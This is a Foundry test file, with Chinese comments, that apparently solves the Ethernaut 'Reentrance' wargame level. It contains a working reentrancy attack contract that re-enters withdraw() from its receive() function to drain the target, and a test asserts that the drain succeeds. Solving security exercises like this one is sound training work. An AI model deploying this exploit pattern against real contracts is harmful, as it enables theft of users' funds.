// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import "../../src/ethernaut/Reentrance.sol"; 

contract AttackReentrance {
    Reentrance public target;
    uint256 public attackAmount = 0.1 ether; // 设置攻击金额

    constructor(address payable _target) public {
        target = Reentrance(_target);
    }

    // 开始攻击
    function attack() external payable {
        require(msg.value >= attackAmount, "Insufficient attack funds");

        // 捐赠给目标合约
        target.donate{value: attackAmount}(address(this));

        // 触发重入攻击
        target.withdraw(attackAmount);
    }

    // 收到以太币时触发重入
    receive() external payable {
        if (address(target).balance >= attackAmount) {
            target.withdraw(attackAmount);
        }
    }
}

contract ReentranceTest is Test {
    Reentrance reentrance;
    AttackReentrance attacker;

    // 设置测试环境
    function setUp() public {
        // 部署 Reentrance 合约并存入 1 ETH
        reentrance = new Reentrance();
        address(reentrance).call{value: 1 ether}(""); // 为合约注入资金
    }

    // 测试重入攻击
    function testAttack() public {
        // 部署攻击合约
        attacker = new AttackReentrance(payable(address(reentrance)));

        // 确保目标合约有足够余额
        assertEq(address(reentrance).balance, 1 ether);

        // 为攻击合约分配资金
        vm.deal(address(attacker), 0.1 ether);

        // 执行攻击
        attacker.attack{value: 0.1 ether}();

        // 验证攻击合约是否成功提取所有资金
        assertEq(address(reentrance).balance, 0); // Reentrance 合约余额应为 0
        assertGt(address(attacker).balance, 1 ether); // 攻击合约余额应大于 1 ETH
    }
}
